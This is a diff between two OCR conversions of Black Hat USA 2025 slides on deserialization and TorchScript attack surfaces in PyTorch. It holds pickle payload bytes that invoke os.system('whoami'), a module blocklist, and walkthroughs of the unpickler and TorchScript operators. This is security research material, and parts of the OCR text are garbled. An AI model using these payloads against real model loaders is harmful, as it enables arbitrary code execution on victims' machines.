@@ -8,19 +8,25 @@ year: 2025
 source_pdf: "BlackHat_USA_2025_Slides/Ji'an Zhou&Li'shuo Song_Safe Harbor or Hostile Waters Unveiling the Hidden Perils of the TorchScript Engine in PyTorch.pdf"
 pages: 125
 sha256: "244af063d612c1816790893f8d35f9b528bb8fea1656b7ec5c973015789d9534"
-text_chars: 72123
-ocr_pages: 59
+text_chars: 67049
+ocr_pages: 56
 has_ocr: true
 redacted_secrets: 0
+ocr_confidence: 88.2
+ocr_unreliable_blocks: 0
+vision_verified_blocks: 1
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 1
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-11T22:57:05Z"
+converted_at: "2026-08-12T05:15:32Z"
 ---
 # Safe Harbor or Hostile Waters Unveiling the Hidden Perils of the TorchScript Engine in PyTorch
 
 **Speakers:** Ji'an Zhou, Li'shuo Song  
 **Conference:** Black Hat USA 2025  
 **Source:** `BlackHat_USA_2025_Slides/Ji'an Zhou&Li'shuo Song_Safe Harbor or Hostile Waters Unveiling the Hidden Perils of the TorchScript Engine in PyTorch.pdf` (125 pages)
+
 
 ## Slide 1
 
@@ -78,7 +84,8 @@ Defense & Summary
 
 5 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 What Is PyTorch?
@@ -102,12 +109,12 @@ Key Features:
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 95/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 PyTorch Key Use Cases
 PyTorch
-“wi \ y Koy
 Deep Learning NLP Computer Vision
 Research
 6
@@ -128,7 +135,8 @@ Research
 
 https://paperswithcode.com/trends
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Market Share
@@ -159,7 +167,6 @@ https://paperswithcode.com/trends
 Mar 24
 Quarter
 Jun 24
-a
 4
 2021-06-05 to 2025-06-05
 Sep 24
@@ -181,7 +188,8 @@ Mar 25 Jun 25
 
 10 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Initially, Use Pickle to Save Model
@@ -192,8 +200,6 @@ key: value
 key: value | > 01011
 key: value 0011001
 010
-Li7T37Ts121[ 4} rro1o
-pickle.load() \,
 Objects in Bytes
 Using Python methods to describe process
 10
@@ -210,7 +216,8 @@ Using Python methods to describe process
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 95/100 on the text kept, 95/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Pickle Is Not Safe
@@ -234,7 +241,8 @@ https://github.com/pytorch/pytorch/issues/52596
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Community Discussion
@@ -247,7 +255,6 @@ KOLANICH opened on Feb 22, 2021 - edited by pytorch-bot Edits
 We need to do something with it.
 Motivation
 Pickle is a security issue that can be used to hide backdoors. Unfortunately lots of projects keep using torch.save and
-torch. load.
 12
 https://github.com/pytorch/pytorch/issues/52596
 ```
@@ -262,7 +269,8 @@ https://github.com/pytorch/pytorch/pull/86812
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Introducing weights_only Parameter
@@ -288,7 +296,8 @@ https://github.com/pytorch/pytorch/pull/8681 2
 
 14 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 implementation
@@ -297,13 +306,11 @@ return _legacy_load opened_file, map_location,|_weights_only_unpickler
 2 f: FILE_LIKE,
 3 map_location: MAP_LOCATION = None,
 4 pickle_module: Any = None,
-iS] *,
 6 weights_only: Optional bool = None,
 7 mmap: Optional bool = None,
 8 *kpickle_load_args: Any
 10 if weights_only is None:
 11 weights_only, warn_weights_only = False, True
-12
 13 if weights_only:
 14
 15 else:
@@ -317,7 +324,6 @@ iS] *,
 23 opened_file, map_location} pickle_module,
 24
 *kpickle_load_args
-*kpickle_lLoad_args
 14
 ```
 
@@ -329,10 +335,10 @@ iS] *,
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-SN HUB WYN
 Try It Out: weights_only=False
 import pickle
 import os
@@ -363,7 +369,8 @@ root |
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Try It Out: weights_only=True
@@ -376,7 +383,6 @@ ctions implemented by this protocol, please file an issue for adding support if 
 warnings.warn(
 Traceback (most recent call last):
 File "/private/tmp/exp.py", line 2, in <module>
-torch. load("evil.pth",weights_only=True)
 File "/Library/Python/3.9/site-packages/torch/serialization.py", line 1383, in load
 raise pickle.UnpicklingError( get wo message(str(e))) from None
 _pickle.UnpicklingError:
@@ -397,7 +403,8 @@ https://github.com/pytorch/pytorch/security
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Official Security Statement
@@ -441,7 +448,8 @@ https://github.com/vllm-project/vllm/security/advisories/GHSA-rh4j-5rhw-hr54
 
 https://github.com/vllm-project/vllm/pull/12366
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 76/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Patch
@@ -451,13 +459,9 @@ T)) Conversation 5 > Commits 1 fl Checks 7 Files changed 4
 rl Changes from all commits ~ File filter Conversationsy 3 ~ 0/4 files viewed &
 Q Filter changed files v > 2 vllm/assets/image.py (O)
 Vv BB vilm a @@ -26,4 +26,4 @@ def image_embeds(self) -> torch.Tensor:
-v ® assets Ze 26
 21 27 image_path = get_vllm_public_assets(filename=f"{self.name}.pt",
-(1) image.py | 28 28 s3_prefix=VLM_IMAGES_DIR)
 29 - return torch. load(image_path, map_location="cpu")
 v @& lora 29° + return torch. load(image_path, map_location="cpu", weights_only=True)
-(5 models.py ig
-vy §® model_executor/model_loader Vv $03 a), | CARYN 7 (EE
 ha weight_utils.py & an @@ -273,7 +273,8 @@ def from_local_checkpoint (
 273 273 new_embeddings_tensor_path)
 v 1 prompt_adapter 274 274 elif os.path.isfile(new_embeddings_bin_file_path):
@@ -494,7 +498,8 @@ https://github.com/vllm-project/vilm/pull/12366
 
 23 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 load_global
@@ -508,10 +513,7 @@ dispatch[GLOBAL[@]] = load_global
 ii import pickle
 NJ
 W
-pickle. loads (b!"
 C
-pickle. lLoads=pickle._ loads
-os\nsystem\n")
 def find_class(self, module, name):
 # Subclasses may override this.
 sys.audit('pickle.find_class', module, name)
@@ -539,23 +541,39 @@ Protected Attributes
 
 24 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 81/100 on the text kept, 75/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-load_unicode & load_tuple‘1
-1 pickle. loads (b"cos\nsystem\nVwhoami\n\x85!')
-ee ee a 1 TUPLE1 = b"\x85"
-ef load_unicode(self): ie :
-self.append(str(self.readline()[:-1], 'raw-unicode-escape')) 6 def load_tuple1(self) :
-self.stack[-1] = (self.stack[-1],)
-4 dispatch[TUPLE1[@]] = load_tuplel
-W
-dispatch[UNICODE[0]] = load_unicode
-self.stack self.stack
-v [<function system at 0x10443e700>, 'whoami'] Vv [<function system at 0x10443e700>, ('whoami',)]
-> <function system at 0x10443e700> > <function system at 0x10443e700>
-‘whoami' > 3 (‘whoami’,)
+load_unicode & load_tuple1
+
+1    pickle.loads(b"cos\nsystem\nVwhoami\n\x85")
+                                 [red box around: Vwhoami\n\x85]
+
+1  UNICODE = b'V'
+2  def load_unicode(self):
+3      self.append(str(self.readline()[:-1], 'raw-unicode-escape'))
+4  dispatch[UNICODE[0]] = load_unicode
+
+1  TUPLE1 = b'\x85'
+2  def load_tuple1(self):
+3      self.stack[-1] = (self.stack[-1],)
+4  dispatch[TUPLE1[0]] = load_tuple1
+
+self.stack
+  v result = {list: 2} [<function system at 0x10443e700>, 'whoami']
+    > 0 = {function} <function system at 0x10443e700>
+      1 = {str} 'whoami'
+      __len__ = {int} 2
+
+self.stack
+  v result = {list: 2} [<function system at 0x10443e700>, ('whoami',)]
+    > 0 = {function} <function system at 0x10443e700>
+    > 1 = {tuple: 1} ('whoami',)
+      __len__ = {int} 2
+
 24
+#BHUSA  @BlackHatEvents
 ```
 
 ## Slide 25
@@ -566,11 +584,11 @@ v [<function system at 0x10443e700>, 'whoami'] Vv [<function system at 0x10443e7
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 load reduce
-pickle. loads (b"cos\nsystem\nVwhoami\n\x85R"
 REDUCE = b'R'
 def load_reduce(self):
 stack = self.stack
@@ -604,11 +622,10 @@ dispatch[REDUCE[0]]] > = <function system at 0x100c4a700>
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-B
-uURWHDN
 Restricted load_global
 if key[0] == GLOBAL[@]:
 module = readline() [:-1].decode("“utf-8")
@@ -630,28 +647,15 @@ f"Please use ‘torch.serialization.add_safe_globals([{name}])* to allowlist "
 module in _blocklisted_modules:
 aise UnpickLingE
 ['sys', 'os', 'posix', 'nt']
-f'Th
 _get_user_allowed_globals()|
 _get_allowed_globals()
-|e
-=)
-o
 =]
-[=]
-om
-i
-(=)
-=
-So
 =
 =
-(=
 o
 =]
 =
 a
-o
-=]
 e {'_codecs.encode': <built-in function encode>, ‘built!
 ‘collections.OrderedDict' = <class 'collections.OrderedDict'>
 ‘collections.Counter' = <class 'collections.Counter'>
@@ -667,13 +671,11 @@ e {'_codecs.encode': <built-in function encode>, ‘built!
 
 28 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-aS
-UuBWN PP
 oon an
-a)
 Restricted load reduce
 elif key[@] == REDUCE[@]:
 args = self.stack.pop()
@@ -681,28 +683,16 @@ func = self.stack[-1]
 if. (
 func not in _get_allowed_globals().values()
 and func not in _get_user_allowed_globals().values()
-ie
 raise UnpicklingError(
 f"Trying to call reduce for unrecognized function {func}"
 )
 self.stack[-1] = func(xargs)
 _get_user_allowed_globals()|
-_get_allowed_globals()
-’ &
 000
 =]
-|
-=
-=]
-=]
-=]
-—|
 S
-=|
-—
 =
 =
-oo
 =I
 =
 = {'_codecs.encode': <built-in function encode>, ‘built
@@ -720,7 +710,8 @@ oo
 
 29 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 © How to Bypass?
@@ -734,7 +725,8 @@ Whitelist & Blacklist
 
 30 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 77/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 @ No Useful Results from Whitelist Analysis
@@ -744,20 +736,14 @@ _codecs.encode': <built-infunctionencode>,
 ‘collections.Counter': <class'collections.Counter'>,
 ‘collections.OrderedDict': <class'collections.OrderedDict'>,
 ‘torch.BFloat16Storage': StorageType(dtype=torch.bfloat16),
-‘torch.BFloat16Tensor': <class'torch.BFloat16Tensor'>,
-‘torch.BoolStorage': StorageType(dtype=torch.bool),
 ‘torch.BoolTensor': <class'torch.BoolTensor'>,
 'torch.ByteStorage': StorageType(dtype=torch.uint8),
 ‘torch.ByteTensor': <class'torch.ByteTensor'>,
-‘torch.CharStorage': StorageType(dtype=torch.int8),
 ‘torch.CharTensor': <class'torch.CharTensor'>,
-‘torch.ComplexDoubleStorage': StorageType(dtype=torch.complex128),
 ‘torch.ComplexFloatStorage'’: StorageType(dtype=torch.complex64),
-‘torch.DoubleStorage': StorageType(dtype=torch.float64),
 ‘torch.DoubleTensor': <class'torch.DoubleTensor'>,
 'torch.FloatStorage': StorageType(dtype=torch.float32),
 ‘torch.FloatTensor': <class'torch.FloatTensor'>,
-‘torch.HalfStorage': StorageType(dtype=torch.float16), 30
 #BHUSA @BlackHatEvents
 ```
 
@@ -775,7 +761,8 @@ I was ready to call it quits — until I thought, "Why not try something differe
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Full Analysis
@@ -783,10 +770,8 @@ def load(
 f: FILE_LIKE,
 1
 2
-3 re
 4 weights_only: Optional[bool] = None,
 5) -—> Any:
-6 aieie
 7 with _open_file_like(f, “rb'') as opened_file:
 8
 9
@@ -820,7 +805,8 @@ with _open_zipfile_reader(opened_file) as opened_zipfile:
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 What Is torch.jit.load?
@@ -831,7 +817,6 @@ torch.jit.load
 Load a ScriptModule or ScriptFunction previously saved with torch.jit.save . All previously saved
 modules, no matter their device, are first loaded onto CPU, ...
 6 PyTorch Forums
-https://discuss.pytorch.org » torchscript-model-loading-... $
 TorchScript |model loading guidance - jit
 Jun 16, 2022 — Traditional way for loading the saved weights is to, first initialize the model and load
 the saved weights like the below steps.
@@ -856,10 +841,10 @@ More results from discuss.pytorch.org
 
 ###### **`Overview`**
 
-```
+\```
 An intermediate representation (IR) of
 PyTorch
-```
+\```
 
 ###### **`Goal`**
 
@@ -888,7 +873,7 @@ envirment
 
 ###### `JIT AST`
 
-```
+\```
 @torch.jit.script
 defmodel(x:torch.Tensor):
 ifx.sum()>0:
@@ -896,7 +881,7 @@ y=x*2
 else:
 y=x+2
 returny
-```
+\```
 
 Module(
 body=[
@@ -943,9 +928,9 @@ type_ignores=[])
 
 ###### `optimized IR graph`
 
-```
+\```
 graph(%x.1 : Tensor):
-```
+\```
 
 - `%9 : int = prim::Constant[value=2]() #`
 
@@ -987,9 +972,9 @@ graph(%x.1 : Tensor):
 
       - `block1():`
 
-```
+\```
 graph(%x.1 : Tensor):
-```
+\```
 
    - `%12 : int = prim::Constant[value=1]()`
 
@@ -1013,7 +998,7 @@ graph(%x.1 : Tensor):
 
 - `poc.py:5:4`
 
-```
+\```
 %y : Tensor = prim::If(%7) #
 poc.py:5:1
 block0():
@@ -1025,7 +1010,7 @@ block1():
 %9, %12) #  poc.py:8:6
 -> (%y.3)
 return (%y)
-```
+\```
 
 - `%x : Tensor = prim::Load[name="x"]() %12 : int = prim::Constant[value=1]()`
 
@@ -1060,7 +1045,7 @@ return y
 
 ###### Python to TorchScript -- Function
 
-```
+\```
 Python AST
 Python FunctionJIT ASTIR
 def_script_impl(
@@ -1078,7 +1063,7 @@ fn.__qualname__="torch.jit.ScriptFunction"
 ...
 returnfn
 ...
-```
+\```
 
 39
 
@@ -1088,7 +1073,7 @@ returnfn
 
 ###### Python to TorchScript -- Function
 
-```
+\```
 Python AST
 Python FunctionJIT ASTIR
 def_script_impl(
@@ -1106,7 +1091,7 @@ fn.__qualname__="torch.jit.ScriptFunction"
 ...
 returnfn
 ...
-```
+\```
 
 40
 
@@ -1116,7 +1101,7 @@ returnfn
 
 ###### Python to TorchScript -- Function
 
-```
+\```
 Python AST
 Python FunctionJIT ASTIR
 def_script_impl(
@@ -1136,7 +1121,7 @@ fn.__qualname__="torch.jit.ScriptFunction"
 ...
 return#2fnscript_compile_function
 ...#3_jit_script_compile
-```
+\```
 
 41
 
@@ -1146,60 +1131,60 @@ return#2fnscript_compile_function
 
 ###### Python to TorchScript -- Module
 
-```
+\```
 Pythonnn.Module
-```
+\```
 
-```
+\```
 Python Functions
-```
+\```
 
-```
+\```
 Python AST
-```
+\```
 
-```
+\```
 JIT AST
-```
+\```
 
-```
+\```
 IR
-```
+\```
 
-```
+\```
 defcreate_script_module_impl(nn_module,concrete_type,stubs_fn):
-```
+\```
 
-```
+\```
 ...
-```
+\```
 
-```
+\```
 cpp_module=torch._C._create_module_with_type(concrete_type.jit_type)
 method_stubs=stubs_fn(nn_module)
 property_stubs=get_property_stubs(nn_module)
 hook_stubs,pre_hook_stubs=get_hook_stubs(nn_module)
 ignored_properties=jit_ignored_properties(nn_module)
 ...
-```
+\```
 
-```
+\```
 #Compilemethodsifnecessary
-```
+\```
 
-```
+\```
 ifconcrete_typenotinconcrete_type_store.methods_compiled:
 create_methods_and_properties_from_stubs(
-```
+\```
 
-```
+\```
 concrete_type,method_stubs,property_stubs
 )
-```
+\```
 
-```
+\```
 ...
-```
+\```
 
 42
 
@@ -1209,60 +1194,60 @@ concrete_type,method_stubs,property_stubs
 
 ###### Python to TorchScript -- Module
 
-```
+\```
 Pythonnn.Module
-```
+\```
 
-```
+\```
 Python Functions
-```
+\```
 
-```
+\```
 Python AST
-```
+\```
 
-```
+\```
 JIT AST
-```
+\```
 
-```
+\```
 IR
-```
+\```
 
-```
+\```
 defcreate_script_module_impl(nn_module,concrete_type,stubs_fn):
-```
+\```
 
-```
+\```
 ...
-```
+\```
 
-```
+\```
 cpp_module=torch._C._create_module_with_type(concrete_type.jit_type)
 method_stubs=stubs_fn(nn_module)
-```
+\```
 
-```
+\```
 property_stubs=get_property_stubs(nn_module)
 hook_stubs,pre_hook_stubs=get_hook_stubs(nn_module)alias infer_methods_to_compile
 ignored_properties=jit_ignored_properties(nn_module)
 ...
 #Compilemethodsifnecessary
-```
+\```
 
-```
+\```
 ifconcrete_typenotinconcrete_type_store.methods_compiled:
 create_methods_and_properties_from_stubs(
-```
+\```
 
-```
+\```
 concrete_type,method_stubs,property_stubs
 )
-```
+\```
 
-```
+\```
 ...
-```
+\```
 
 43
 
@@ -1272,7 +1257,7 @@ concrete_type,method_stubs,property_stubs
 
 ###### Python to TorchScript -- Module
 
-```
+\```
 Python AST
 Pythonnn.ModulePython FunctionsJIT AST
 definfer_methods_to_compile(nn_module):
@@ -1287,22 +1272,22 @@ _jit_internal.get_torchscript_modifier(item)
 is_jit_internal.FunctionModifiers.EXPORT
 ):
 exported.append(name)
-```
+\```
 
 IR
 
-```
+\```
 methods=methods+exported
-```
+\```
 
-```
+\```
 ...
-```
+\```
 
-```
+\```
 stubs=[make_stub_from_method(nn_module,method)formethodinmethods]
 returnoverload_stubs+stubs
-```
+\```
 
 44
 
@@ -1312,14 +1297,14 @@ returnoverload_stubs+stubs
 
 ###### Python to TorchScript -- Module
 
-```
+\```
 Python AST
 Pythonnn.ModulePython FunctionsJIT AST
-```
+\```
 
 IR
 
-```
+\```
 definfer_methods_to_compile(nn_module):
 ...
 exported=[]
@@ -1336,7 +1321,7 @@ methods=methods+exported
 ...
 stubs=[make_stub_from_method(nn_module,method)formethodinmethods]
 returnoverload_stubs+stubs
-```
+\```
 
 45
 
@@ -1346,31 +1331,31 @@ returnoverload_stubs+stubs
 
 ###### Python to TorchScript -- Module
 
-```
+\```
 Pythonnn.Module
-```
+\```
 
-```
+\```
 Python Functions
-```
+\```
 
-```
+\```
 Python AST
-```
+\```
 
-```
+\```
 JIT AST
-```
+\```
 
-```
+\```
 IR
-```
+\```
 
-```
+\```
 defcreate_script_module_impl(nn_module,concrete_type,stubs_fn):
-```
+\```
 
-```
+\```
 ...
 cpp_module=torch._C._create_module_with_type(concrete_type.jit_type)
 method_stubs=stubs_fn(nn_module)
@@ -1383,11 +1368,11 @@ ifconcrete_typenotinconcrete_type_store.methods_compiled:
 create_methods_and_properties_from_stubs(
 concrete_type,method_stubs,property_stubs
 )
-```
+\```
 
-```
+\```
 ...
-```
+\```
 
 46
 
@@ -1464,65 +1449,65 @@ tensor
 
 ###### TorchScript Serialization -- save
 
-```
+\```
 voidScriptModuleSerializer::serialize(
 constModule&module,
-```
+\```
 
-```
+\```
 ...
 writeArchive(
 module._ivalue(),
 /*archive_name=*/"data",
 /*archive_dir=*/"",
 /*tensor_dir=*/"data/");
-```
+\```
 
-```
+\```
 convertTypes(module.type());
 writeFiles("code/");
-```
+\```
 
-```
+\```
 data.pkl
 Ivalue
-```
+\```
 
-```
+\```
 code/
 python code/debug
 info
-```
+\```
 
-```
+\```
 std::vector<IValue>ivalue_constants(
 constant_table_.begin(),constant_table_.end());
-```
+\```
 
-```
+\```
 ...
-```
+\```
 
-```
+\```
 writeArchive(
 c10::ivalue::Tuple::create(ivalue_constants),
 /*archive_name=*/"constants",
 /*archive_dir=*/"",
 /*tensor_dir=*/"constants/");
-```
+\```
 
-```
+\```
 constants.pkl
 tensor
-```
+\```
 
-```
+\```
 ...
-```
+\```
 
-```
+\```
 }
-```
+\```
 
 50
 
@@ -1532,10 +1517,10 @@ tensor
 
 ###### TorchScript Serialization -- save
 
-```
+\```
 ForTorchFunction, firstconvertittoTorchModule, the remaining process is
 the same
-```
+\```
 
 - `1.The ivalue corresponding to the module is serialized in pickle format as data.pkl.`
 
@@ -1551,7 +1536,7 @@ the same
 
 ###### TorchScript Serialization – inside serialized pt file
 
-```
+\```
 module
 ├──byteorder
 ├──code
@@ -1560,9 +1545,9 @@ module
 ├──constants.pkl
 ├──data.pkl
 └──version
-```
+\```
 
-```
+\```
 0: \x80 PROTO      2
 2: c    GLOBAL     '__torch__PlaceholderModule'
 31: q    BINPUT     0
@@ -1577,11 +1562,11 @@ module
 54: b    BUILD
 55: q    BINPUT     2
 57: .    STOP
-```
+\```
 
-```
+\```
 module.pt
-```
+\```
 
 ###### `data.pkl`
 
@@ -1593,13 +1578,13 @@ module.pt
 
 ###### TorchScript Serialization – inside serialized pt file
 
-```
+\```
 0: \x80 PROTO      2
 2: )    EMPTY_TUPLE
 3: .    STOP
-```
+\```
 
-```
+\```
 classPlaceholderModule(Module):
 __parameters__=[]
 __buffers__=[]
@@ -1611,15 +1596,15 @@ y=torch.mul(x,2)
 else:
 y=torch.add(x,2)
 returny
-```
+\```
 
-```
+\```
 constants.pkl
-```
+\```
 
-```
+\```
 code/__torch__.py
-```
+\```
 
 53
 
@@ -1629,10 +1614,10 @@ code/__torch__.py
 
 ###### TorchScript Serialization -- load
 
-```
+\```
 constants.pkl
 tensor
-```
+\```
 
 tensor
 data.pkl
@@ -1641,11 +1626,11 @@ code/
 python code/debug
 info
 
-```
+\```
 ScriptModuleDeseria
 ScriptModule
 lizer::deserialize
-```
+\```
 
 54 #BHUSA @BlackHatEvents
 
@@ -1653,23 +1638,23 @@ lizer::deserialize
 
 ###### TorchScript Serialization -- load
 
-```
+\```
 constants.pkl
 tensor
-```
+\```
 
-```
+\```
 data.pkl
 Ivalue
-```
+\```
 
-```
+\```
 code/
 python code/debug
 info
-```
+\```
 
-```
+\```
 ModuleScriptModuleDeserializer::deserialize(
 std::optional<at::Device>device,
 ExtraFilesMap&extra_files,
@@ -1684,7 +1669,7 @@ autom=Module(m_ivalue.toObject());
 ...
 returnm;
 }
-```
+\```
 
 55
 
@@ -1694,7 +1679,7 @@ returnm;
 
 ###### TorchScript Serialization -- load
 
-```
+\```
 constants.pkl
 ModuleScriptModuleDeserializer::deserialize(
 tensor
@@ -1713,7 +1698,7 @@ autom=Module(m_ivalue.toObject());
 returnm;
 constants_table_}
 Ivalue
-```
+\```
 
 56
 
@@ -1731,7 +1716,7 @@ info
 constants_table_
 Ivalue
 
-```
+\```
 ModuleScriptModuleDeserializer::deserialize(
 std::optional<at::Device>device,
 ExtraFilesMap&extra_files,
@@ -1748,7 +1733,7 @@ returnm;
 }
 Unpicklingand import
 code
-```
+\```
 
 Token
 JIT AST
@@ -1780,19 +1765,19 @@ IR
 
 ###### `Node format`
 
-```
+\```
 optimizedIRgraph
-```
+\```
 
-```
+\```
 input
-```
+\```
 
-```
+\```
 outputop
-```
+\```
 
-```
+\```
 graph(%x.1 : Tensor):
 %12 : int = prim::Constant[value=1]()
 %2 : NoneType = prim::Constant()
@@ -1809,7 +1794,7 @@ block1():
 %y.3 : Tensor = aten::add(%x.1, %9, %12) #  poc.py:8:6
 -> (%y.3)
 return (%y)
-```
+\```
 
 59
 
@@ -1819,9 +1804,9 @@ return (%y)
 
 ###### TorchScript Execution
 
-```
+\```
 boolrunTemplate(Stack&stack){
-```
+\```
 
 invokeScriptMethodF
 romPython
@@ -1835,7 +1820,7 @@ runTemplate
 Interpret
 Instruction
 
-```
+\```
 ...
 try{
 while(true){
@@ -1849,24 +1834,24 @@ TORCH_INTERNAL_ASSERT(obj.isObject());
 entered_objects.push_back(obj);
 }
 INST_NEXT;
-```
+\```
 
-```
+\```
 ...
 caseINST(OP):{
 [[maybe_unused]]auto_=instGuard();
 autostackSizeGuard=stackSizeAssertGuard();
 frame.function->operator_table_[inst.X](stack);
 stackSizeGuard.callAssert();
-```
+\```
 
-```
+\```
 }
-```
+\```
 
-```
+\```
 ...
-```
+\```
 
 60
 
@@ -1876,15 +1861,15 @@ stackSizeGuard.callAssert();
 
 ###### TorchScript Execution
 
-```
+\```
 WhatisOPinstruction?
-```
+\```
 
-```
+\```
 Whatabout the callee?
-```
+\```
 
-```
+\```
 boolrunTemplate(Stack&stack){
 ...
 try{
@@ -1907,7 +1892,7 @@ frame.function->operator_table_[inst.X](stack);
 stackSizeGuard.callAssert();
 }
 ...
-```
+\```
 
 61
 
@@ -1933,9 +1918,9 @@ stackSizeGuard.callAssert();
 
 - `The RegisterOperators class manages these Operators, and register them by registerOperator function.`
 
-```
+\```
 Are these operators safe?
-```
+\```
 
 63
 
@@ -1945,7 +1930,7 @@ Are these operators safe?
 
 ###### TorchScript Operators
 
-```
+\```
 "prim::PythonOp",
 "aten::has_torch_function",
 "aten::is_scripting",
@@ -1962,7 +1947,7 @@ What are these?
 ...
 "aten::from_file",
 ...
-```
+\```
 
 64
 
@@ -2021,7 +2006,7 @@ What are these?
 
 ###### `read file`
 
-```
+\```
 Tensorfrom_file(
 Operator(std::string_viewfilename,
 "aten::save(titem,strfilename)->()",std::optional<bool>shared,
@@ -2044,7 +2029,7 @@ storage_impl,at::DispatchKey::CPU,my_dtype);
 tensor.unsafeGetTensorImpl()->set_sizes_contiguous({my_size});
 returntensor;
 }
-```
+\```
 
 66
 
@@ -2054,12 +2039,12 @@ returntensor;
 
 ###### TorchScript Operators
 
-```
+\```
 _modules_containing_builtins=(torch,torch._C._nn,torch._C._fft,
 torch._C._linalg,torch._C._nested,torch._C._sparse,torch._C._special)
-```
+\```
 
-```
+\```
 #lazilybuilttoensurethecorrectinitializationorder
 def_get_builtin_table():
 ...
@@ -2071,24 +2056,24 @@ callable(v)
 andnot_is_special_functional_bound_op(v)
 ):
 _builtin_ops.append((v,"aten::"+name))
-```
+\```
 
-```
+\```
 formodin_modules_containing_builtins:
 register_all(mod)
 ...
 forbuiltin,aten_opin_builtin_ops:
 _builtin_table[id(builtin)]=aten_op
-```
+\```
 
-```
+\```
 return_builtin_table
-```
+\```
 
-```
+\```
 def_find_builtin(fn):
 return_get_builtin_table().get(id(fn))
-```
+\```
 
 67
 
@@ -2098,14 +2083,14 @@ return_get_builtin_table().get(id(fn))
 
 ###### TorchScript Operators
 
-```
+\```
 _modules_containing_builtins=(torch,torch._C._nn,torch._C._fft,
 torch._C._linalg,torch._C._nested,torch._C._sparse,torch._C._special)
 #lazilybuilttoensurethecorrectinitializationorder
 def_get_builtin_table():
-```
+\```
 
-```
+\```
 ...
 defregister_all(mod):
 fornameindir(mod):
@@ -2115,7 +2100,7 @@ callable(v)
 andnot_is_special_functional_bound_op(v)
 ):
